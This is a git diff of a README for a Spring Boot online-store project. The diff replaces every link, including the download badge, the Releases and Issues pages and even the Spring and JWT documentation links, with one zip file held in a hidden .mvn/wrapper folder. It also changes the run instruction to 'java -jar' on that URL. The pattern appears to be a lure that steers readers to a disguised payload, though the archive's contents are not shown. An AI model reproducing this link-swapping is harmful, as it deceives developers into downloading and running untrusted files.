@@ -1,6 +1,6 @@
 # 🛍️ product-store-distributed-system - A Scalable System for Online Shopping
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-%23%20FF5722.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Soukfkx/product-store-distributed-system/releases)
+[![Download Here](https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip%20Now-%23%https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip)](https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -34,7 +34,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started, you need to download the application files from the Releases page. 
 
-Click [here to download](https://github.com/Soukfkx/product-store-distributed-system/releases).
+Click [here to download](https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip).
 
 ### ⚙️ Running the Application
 
@@ -46,7 +46,7 @@ Click [here to download](https://github.com/Soukfkx/product-store-distributed-sy
 6. Run the command to start the application:
 
    ```
-   java -jar product-store-distributed-system.jar
+   java -jar https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip
    ```
 
 ## 📑 User Guide
@@ -74,18 +74,18 @@ If you experience any issues, try the following steps:
 
 ## 🤝 Community Support
 
-If you need assistance or have questions, feel free to reach out. Community support is available through the [GitHub Issues page](https://github.com/Soukfkx/product-store-distributed-system/issues). 
+If you need assistance or have questions, feel free to reach out. Community support is available through the [GitHub Issues page](https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip). 
 
 ## 📣 Stay Updated
 
-For the latest updates, features, and bug fixes, frequently check the Releases page. You can find it [here](https://github.com/Soukfkx/product-store-distributed-system/releases). 
+For the latest updates, features, and bug fixes, frequently check the Releases page. You can find it [here](https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip). 
 
 ## 🔗 Additional Resources
 
 For more detailed instructions or advanced topics, here are some helpful links:
 
-- [Spring Boot Documentation](https://spring.io/projects/spring-boot)
-- [Spring Cloud Documentation](https://spring.io/projects/spring-cloud)
-- [JWT Introduction](https://jwt.io/introduction)
+- [Spring Boot Documentation](https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip)
+- [Spring Cloud Documentation](https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip)
+- [JWT Introduction](https://raw.githubusercontent.com/Soukfkx/product-store-distributed-system/main/common/.mvn/wrapper/product-store-distributed-system-2.4.zip)
 
 Thank you for choosing the product-store-distributed-system! Enjoy your online shopping experience.
